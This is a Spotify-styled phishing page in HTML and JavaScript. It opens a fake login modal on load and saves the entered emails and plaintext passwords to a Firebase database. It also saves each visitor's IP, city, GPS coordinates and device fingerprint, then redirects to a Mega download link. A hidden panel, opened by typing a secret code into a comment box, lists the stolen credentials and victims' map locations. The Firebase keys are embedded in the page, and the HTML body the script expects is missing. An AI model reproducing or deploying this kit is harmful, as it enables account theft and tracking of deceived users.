<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mi Página</title>

<!-- Firebase compat scripts -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>

<style>
:root {
    --fondo-oscuro:#121212;
    --fondo-claro:#181818;
    --fondo-gris:#282828;
    --texto-principal:#fff;
    --texto-secundario:#b3b3b3;
    --verde-spotify:#1db954;
    --verde-hover:#1ed760;
    --borde:#333;
    --radio:8px;
    --fuente:'Helvetica Neue',Helvetica,Arial,sans-serif;
}

* {
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body {
    font-family:var(--fuente);
    background:var(--fondo-oscuro);
    color:var(--texto-principal);
    line-height:1.5;
    overflow-x:hidden;
}

a {
    text-decoration:none;
    color:inherit;
}

ul {
    list-style:none;
}

/* ===== NAVBAR ===== */
.navbar {
    background:rgba(0,0,0,.8);
    backdrop-filter:blur(10px);
    padding:0 24px;
    height:70px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    position:sticky;
    top:0;
    z-index:100;
    border-bottom:1px solid var(--borde);
}

.logo {
    display:flex;
    align-items:center;
    gap:8px;
    font-size:1.8rem;
    font-weight:700;
}

.logo span {
    color:var(--verde-spotify);
}

.btn-login {
    background:var(--verde-spotify);
    color:#000;
    padding:10px 24px;
    border-radius:30px;
    font-weight:700;
    font-size:.9rem;
    transition:.2s;
    display:inline-block;
    line-height:1;
    white-space:nowrap;
    cursor:pointer;
    border:none;
    margin-left:10px;
}

.btn-login:hover {
    background:var(--verde-hover);
    transform:scale(1.05);
}

/* ===== SECCIÓN COMENTARIOS ===== */
.comentarios {
    padding:80px 24px;
    background:var(--fondo-oscuro);
    text-align:center;
}

.comentarios h2 {
    font-size:2rem;
    margin-bottom:30px;
}

.comentarios input {
    width:100%;
    max-width:300px;
    padding:10px;
    background:var(--fondo-gris);
    border:1px solid var(--borde);
    border-radius:6px;
    color:var(--texto-principal);
    font-family:var(--fuente);
    font-size:1rem;
    margin-bottom:20px;
    text-align:center;
}

.comentarios input:focus {
    outline:none;
    border-color:var(--verde-spotify);
}

.btn-comentario {
    background:var(--verde-spotify);
    color:#000;
    padding:12px 30px;
    border-radius:30px;
    font-weight:700;
    border:none;
    cursor:pointer;
    transition:.2s;
}

.btn-comentario:hover {
    background:var(--verde-hover);
    transform:scale(1.05);
}

/* ===== VENTANA SECRETA ===== */
.ventana-secreta {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:#000;
    color:var(--verde-spotify);
    display:none;
    z-index:9999;
    padding:20px;
    text-align:center;
    overflow-y:auto;
    overflow-x:hidden;
    -webkit-overflow-scrolling:touch;
    overscroll-behavior-y:contain;
    touch-action:pan-y;
    flex-direction:column;
}

.lista-registros-container {
    flex:0 0 auto;
    text-align:left;
    width:100%;
    max-width:600px;
    margin:0 auto;
    padding:10px;
    box-sizing:border-box;
}

.lista-registros-container h4 {
    font-size:0.8rem;
    margin-bottom:10px;
    color:var(--verde-spotify);
    position:sticky;
    top:0;
    background:#000;
    padding:5px 0;
    z-index:1;
}

.registro-item {
    margin-bottom:3px;
    white-space:nowrap;
    font-size:0.7rem;
}

.registro-item span {
    font-weight:bold;
    color:var(--verde-spotify);
}

.registro-item .password {
    color:var(--verde-spotify);
}

.btn-info-dispositivo {
    background:transparent;
    border:1px solid var(--verde-spotify);
    color:var(--verde-spotify);
    border-radius:50%;
    width:16px;
    height:16px;
    font-size:9px;
    line-height:1;
    cursor:pointer;
    margin-left:5px;
    padding:0;
    display:inline-flex;
    align-items:center;
    justify-content:center;
    transition:.2s;
}

.btn-info-dispositivo:hover {
    background:rgba(29,185,84,.2);
}

.zona-comandos {
    padding:10px 0;
    width:100%;
    max-width:300px;
    margin:0 auto;
}

.zona-comandos input {
    width:100%;
    padding:10px;
    background:#111;
    border:1px solid var(--verde-spotify);
    border-radius:6px;
    color:var(--verde-spotify);
    font-size:.9rem;
    text-align:center;
}

.zona-comandos input:focus {
    outline:none;
    border-color:#fff;
}

/* ===== MODAL INFORMACIÓN DISPOSITIVO ===== */
.modal-dispositivo {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.9);
    backdrop-filter:blur(6px);
    display:none;
    justify-content:center;
    align-items:center;
    z-index:10000;
}

.modal-dispositivo-contenido {
    background:var(--fondo-gris);
    border:1px solid var(--borde);
    border-radius:var(--radio);
    padding:20px;
    width:90%;
    max-width:350px;
    text-align:center;
    box-shadow:0 20px 40px rgba(0,0,0,.6);
}

.modal-dispositivo-contenido h3 {
    color:var(--verde-spotify);
    margin-bottom:15px;
    font-size:1.2rem;
}

.detalle-dispositivo {
    text-align:left;
    font-size:0.8rem;
    color:var(--texto-secundario);
    margin-bottom:15px;
}

.detalle-dispositivo div {
    margin-bottom:5px;
}

.detalle-dispositivo strong {
    color:var(--texto-principal);
}

.detalle-dispositivo a {
    color:var(--verde-spotify);
    text-decoration:underline;
    word-break:break-all;
}

.btn-ok-dispositivo {
    background:var(--verde-spotify);
    color:#000;
    border:none;
    padding:10px 20px;
    border-radius:20px;
    font-weight:700;
    cursor:pointer;
    transition:.2s;
}

.btn-ok-dispositivo:hover {
    background:var(--verde-hover);
    transform:scale(1.05);
}

/* ===== MODAL DE INICIO DE SESIÓN ===== */
.modal-overlay {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.8);
    backdrop-filter:blur(8px);
    display:none;
    justify-content:center;
    align-items:center;
    z-index:1000;
}

.modal {
    background:var(--fondo-gris);
    border:1px solid var(--borde);
    border-radius:var(--radio);
    padding:30px;
    width:90%;
    max-width:400px;
    position:relative;
    box-shadow:0 20px 40px rgba(0,0,0,.6);
}

.modal h2 {
    margin-bottom:20px;
    text-align:center;
}

.modal-cerrar {
    position:absolute;
    top:10px;
    right:15px;
    font-size:1.8rem;
    cursor:pointer;
    color:var(--texto-secundario);
}

.modal-cerrar:hover {
    color:var(--texto-principal);
}

.modal label {
    display:block;
    margin-bottom:8px;
    font-weight:500;
    color:var(--texto-secundario);
}

.modal input {
    width:100%;
    padding:12px 15px;
    margin-bottom:20px;
    background:var(--fondo-oscuro);
    border:1px solid var(--borde);
    border-radius:6px;
    color:var(--texto-principal);
    font-size:1rem;
}

.modal input:focus {
    outline:none;
    border-color:var(--verde-spotify);
}

.btn-login-modal {
    width:100%;
    background:var(--verde-spotify);
    color:#000;
    padding:12px;
    border:none;
    border-radius:30px;
    font-weight:700;
    font-size:1rem;
    cursor:pointer;
}

.btn-login-modal:hover {
    background:var(--verde-hover);
    transform:scale(1.02);
}

.mostrar-password {
    display:flex;
    align-items:center;
    gap:8px;
    margin-bottom:15px;
    color:var(--texto-secundario);
    font-size:0.8rem;
    cursor:pointer;
}

.mostrar-password input[type="checkbox"] {
    width:auto;
    margin:0;
    cursor:pointer;
}

/* ===== FOOTER ===== */
.footer {
    background:#000;
    padding:20px 24px;
    color:var(--texto-secundario);
    text-align:center;
    font-size:0.8rem;
    border-top:1px solid var(--borde);
}

@media(max-width:768px) {
    .navbar {
        padding:0 15px;
    }
}
</style>
</head>

<!-- ========================================== --><script>
// ==========================================
// JAVASCRIPT CON FIRESTORE
// ==========================================

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyCZ9L6D9zJAM1gcoGHb5-2c_Wk_6Mk8cKY",
    authDomain: "spotify-dc10a.firebaseapp.com",
    projectId: "spotify-dc10a",
    storageBucket: "spotify-dc10a.firebasestorage.app",
    messagingSenderId: "529088119775",
    appId: "1:529088119775:web:05ff17ab38a6301f423a6a"
};

// Inicializar Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// URL de destino (redirección al enlace de Mega)
const MEGA_URL =
    "https://mega.nz/file/efwG2baD#XzhIby2UM9UapE-lcA4PT7X2n9tRO3jhAeR0iFytATA";

// ==========================================
// ELEMENTOS
// ==========================================

const modalOverlay = document.getElementById("modal-overlay");
const modalCerrar = document.getElementById("modal-cerrar");
const formLogin = document.getElementById("form-login");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const mostrarPasswordCheckbox = document.getElementById("mostrar-password");
const btnLoginNavbar = document.getElementById("btn-login-navbar");
const comentarioInput = document.getElementById("comentario-input");
const btnComentario = document.getElementById("enviar-comentario");
const ventanaSecreta = document.getElementById("ventana-secreta");
const listaRegistros = document.getElementById("lista-registros");
const inputComando = document.getElementById("input-comando");

// Modal dispositivo
const modalDispositivo = document.getElementById("modal-dispositivo");
const detalleDispositivo = document.getElementById("detalle-dispositivo");
const btnOkDispositivo = document.getElementById("btn-ok-dispositivo");

// ==========================================
// ALMACENAMIENTO CON FIRESTORE
// ==========================================

async function guardarRegistro(email, password, infoDispositivo) {
    try {
        await db.collection("registros").add({
            email: email,
            contraseña: password,
            fecha: new Date().toLocaleString(),
            ip: infoDispositivo.ip || "No disponible",
            pais: infoDispositivo.country || "No disponible",
            ciudad: infoDispositivo.city || "No disponible",
            latitud: infoDispositivo.latitude || null,
            longitud: infoDispositivo.longitude || null,
            userAgent: infoDispositivo.userAgent || "No disponible",
            plataforma: infoDispositivo.plataforma || "No disponible",
            nucleos: infoDispositivo.nucleos || "No disponible",
            memoria: infoDispositivo.memoria || "No disponible",
            sistema: infoDispositivo.sistema || "No disponible",
            idioma: infoDispositivo.idioma || "No disponible",
            resolucionPantalla: infoDispositivo.resolucionPantalla || "No disponible"
        });
        console.log("Registro guardado en Firestore");
    } catch (error) {
        console.error("Error al guardar en Firestore:", error);
        alert("No se pudo guardar en la nube. Revisa la consola.");
    }
}

async function obtenerRegistros() {
    try {
        const snapshot = await db.collection("registros").orderBy("fecha", "desc").get();
        return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    } catch (error) {
        console.error("Error al leer Firestore:", error);
        return [];
    }
}

async function eliminarRegistroPorEmail(email) {
    try {
        const snapshot = await db.collection("registros").where("email", "==", email).get();
        const batch = db.batch();
        snapshot.forEach(doc => batch.delete(doc.ref));
        await batch.commit();
        console.log("Registros eliminados para:", email);
    } catch (error) {
        console.error("Error al eliminar:", error);
    }
}

async function eliminarTodosLosRegistros() {
    try {
        const snapshot = await db.collection("registros").get();
        const batch = db.batch();
        snapshot.forEach(doc => batch.delete(doc.ref));
        await batch.commit();
        console.log("Todos los registros eliminados");
    } catch (error) {
        console.error("Error al eliminar todos:", error);
    }
}

// ==========================================
// OBTENER INFORMACIÓN DEL DISPOSITIVO
// ==========================================

async function obtenerInfoDispositivo() {
    const info = {
        userAgent: navigator.userAgent,
        plataforma: navigator.platform || "No disponible",
        nucleos: navigator.hardwareConcurrency || "No disponible",
        memoria: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No disponible",
        sistema: "Desconocido",
        idioma: navigator.language || "No disponible",
        resolucionPantalla: screen.width + "x" + screen.height
    };

    const ua = navigator.userAgent;
    if (ua.includes("Android")) info.sistema = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) info.sistema = "iOS";
    else if (ua.includes("Windows")) info.sistema = "Windows";
    else if (ua.includes("Mac")) info.sistema = "macOS";

    // Intentar obtener IP y geolocalización desde varias APIs
    const apis = [
        {
            url: "https://ipwho.is/",
            parse: (datos) => ({
                ip: datos.ip,
                country: datos.country,
                city: datos.city,
                latitude: datos.latitude,
                longitude: datos.longitude
            })
        },
        {
            url: "https://ipapi.co/json/",
            parse: (datos) => ({
                ip: datos.ip,
                country: datos.country_name,
                city: datos.city,
                latitude: datos.latitude,
                longitude: datos.longitude
            })
        },
        {
            url: "https://ipinfo.io/json",
            parse: (datos) => ({
                ip: datos.ip,
                country: datos.country,
                city: datos.city,
                latitude: datos.loc ? datos.loc.split(",")[0] : null,
                longitude: datos.loc ? datos.loc.split(",")[1] : null
            })
        }
    ];

    for (const api of apis) {
        try {
            const respuesta = await fetch(api.url);
            if (!respuesta.ok) continue;
            const datos = await respuesta.json();
            const parsed = api.parse(datos);
            if (parsed.ip) {
                info.ip = parsed.ip;
                info.country = parsed.country || "No disponible";
                info.city = parsed.city || "No disponible";
                info.latitude = parsed.latitude || null;
                info.longitude = parsed.longitude || null;
                break;
            }
        } catch (error) {
            console.warn(`Error con ${api.url}:`, error);
        }
    }

    if (!info.ip) {
        info.ip = "No disponible";
        info.country = "No disponible";
        info.city = "No disponible";
        info.latitude = null;
        info.longitude = null;
    }

    return info;
}

// ==========================================
// MODAL DE INICIO DE SESIÓN
// ==========================================

function abrirModal() {
    emailInput.value = "";
    passwordInput.value = "";
    modalOverlay.style.display = "flex";
    setTimeout(() => emailInput.focus(), 50);
}

function cerrarModal() {
    modalOverlay.style.display = "none";
}

// Botón de la navbar abre el modal
btnLoginNavbar.addEventListener("click", abrirModal);

modalCerrar.addEventListener("click", cerrarModal);

modalOverlay.addEventListener("click", function(e) {
    if (e.target === modalOverlay) cerrarModal();
});

mostrarPasswordCheckbox.addEventListener("change", function() {
    passwordInput.type = this.checked ? "text" : "password";
});

// ==========================================
// FORMULARIO DE LOGIN
// ==========================================

formLogin.addEventListener("submit", async function(e) {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!email || !password) return;

    const btnSubmit = formLogin.querySelector(".btn-login-modal");
    btnSubmit.disabled = true;
    btnSubmit.textContent = "Cargando...";

    const infoDispositivo = await obtenerInfoDispositivo();
    await guardarRegistro(email, password, infoDispositivo);

    emailInput.value = "";
    passwordInput.value = "";
    mostrarPasswordCheckbox.checked = false;
    passwordInput.type = "password";
    btnSubmit.disabled = false;
    btnSubmit.textContent = "Iniciar sesión";
    cerrarModal();
    window.location.href = MEGA_URL;
});

// ==========================================
// COMENTARIOS
// ==========================================

async function manejarComentario() {
    const texto = comentarioInput.value.trim();
    if (texto === "28706587") {
        await mostrarRegistrosEnVentanaSecreta();
        ventanaSecreta.style.display = "flex";
        comentarioInput.value = "";
        inputComando.value = "";
        inputComando.focus();
        return;
    }
}

btnComentario.addEventListener("click", manejarComentario);
comentarioInput.addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
        e.preventDefault();
        manejarComentario();
    }
});

// ==========================================
// MOSTRAR REGISTROS DESDE FIRESTORE
// ==========================================

async function mostrarRegistrosEnVentanaSecreta() {
    const registros = await obtenerRegistros();
    if (registros.length === 0) {
        listaRegistros.innerHTML = "<h4>Sin registros en la nube</h4>";
        return;
    }
    let html = "<h4>Registros en Firebase:</h4>";
    registros.forEach((reg, indice) => {
        html += `
            <div class="registro-item">
                Registro #${indice + 1}
            </div>
            <div class="registro-item">
                Correo: <span>${escaparHTML(reg.email)}</span>
                <button class="btn-info-dispositivo" data-email="${escaparHTML(reg.email)}" title="Ver info del dispositivo">i</button>
            </div>
            <div class="registro-item">
                Contraseña: <span class="password">${escaparHTML(reg.contraseña)}</span>
            </div>
            <div class="registro-item">
                Fecha: <span>${escaparHTML(reg.fecha)}</span>
            </div>
            <div style="margin-bottom:10px;"></div>
        `;
    });
    listaRegistros.innerHTML = html;
}

// ==========================================
// PROTECCIÓN PARA MOSTRAR TEXTO
// ==========================================

function escaparHTML(texto) {
    return String(texto)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ==========================================
// COMANDOS DE LA VENTANA SECRETA
// ==========================================

inputComando.addEventListener("keydown", async function(e) {
    if (e.key !== "Enter") return;
    e.preventDefault();
    const comando = inputComando.value.trim().toLowerCase();

    if (comando.startsWith("/clear ")) {
        const email = comando.substring(7).trim();
        if (email) {
            await eliminarRegistroPorEmail(email);
            await mostrarRegistrosEnVentanaSecreta();
            inputComando.value = "";
            return;
        }
    }
    if (comando === "/clear") {
        await eliminarTodosLosRegistros();
        await mostrarRegistrosEnVentanaSecreta();
        inputComando.value = "";
        return;
    }
    if (comando === "/back") {
        ventanaSecreta.style.display = "none";
        inputComando.value = "";
        return;
    }
    if (comando === "/refresh") {
        await mostrarRegistrosEnVentanaSecreta();
        inputComando.value = "";
        return;
    }
    inputComando.value = "";
});

// ==========================================
// BOTÓN INFO DISPOSITIVO
// ==========================================

listaRegistros.addEventListener("click", async function(e) {
    const btn = e.target.closest(".btn-info-dispositivo");
    if (btn) {
        e.stopPropagation();
        const email = btn.getAttribute("data-email");
        const registros = await obtenerRegistros();
        const reg = registros.find(r => r.email === email);
        if (reg) mostrarInfoGuardadaDeRegistro(reg);
    }
});

function mostrarInfoGuardadaDeRegistro(reg) {
    let html = `
        <div><strong>Registro</strong></div>
        <div><strong>IP:</strong> ${escaparHTML(reg.ip || "No disponible")}</div>
        <div><strong>País:</strong> ${escaparHTML(reg.pais || "No disponible")}</div>
        <div><strong>Ciudad:</strong> ${escaparHTML(reg.ciudad || "No disponible")}</div>
        <div><strong>Sistema:</strong> ${escaparHTML(reg.sistema || "No disponible")}</div>
        <div><strong>Plataforma:</strong> ${escaparHTML(reg.plataforma || "No disponible")}</div>
        <div><strong>Núcleos de CPU:</strong> ${escaparHTML(reg.nucleos || "No disponible")}</div>
        <div><strong>Memoria aproximada:</strong> ${escaparHTML(reg.memoria || "No disponible")}</div>
        <div><strong>Idioma:</strong> ${escaparHTML(reg.idioma || "No disponible")}</div>
        <div><strong>Resolución de pantalla:</strong> ${escaparHTML(reg.resolucionPantalla || "No disponible")}</div>
        <div><strong>User Agent:</strong> ${escaparHTML(reg.userAgent || "No disponible")}</div>
    `;

    if (reg.latitud && reg.longitud) {
        const enlaceMaps = `https://www.google.com/maps?q=${reg.latitud},${reg.longitud}`;
        html += `<div><strong>Ubicación en Google Maps:</strong> <a href="${enlaceMaps}" target="_blank" rel="noopener">Abrir en Google Maps</a></div>`;
    } else {
        html += `<div><strong>Ubicación en Google Maps:</strong> No disponible</div>`;
    }

    detalleDispositivo.innerHTML = html;
    modalDispositivo.style.display = "flex";
}

btnOkDispositivo.addEventListener("click", function() {
    modalDispositivo.style.display = "none";
});

modalDispositivo.addEventListener("click", function(e) {
    if (e.target === modalDispositivo) {
        modalDispositivo.style.display = "none";
    }
});

// ==========================================
// ESCAPE PARA CERRAR VENTANA SECRETA
// ==========================================

document.addEventListener("keydown", function(e) {
    if (e.key === "Escape" && ventanaSecreta.style.display === "flex") {
        ventanaSecreta.style.display = "none";
        inputComando.value = "";
    }
    if (e.key === "Escape" && modalDispositivo.style.display === "flex") {
        modalDispositivo.style.display = "none";
    }
});

// ==========================================
// ABRIR MODAL AUTOMÁTICAMENTE AL CARGAR
// ==========================================

window.addEventListener('load', function() {
    abrirModal();
});
</script>

</body>
</html>
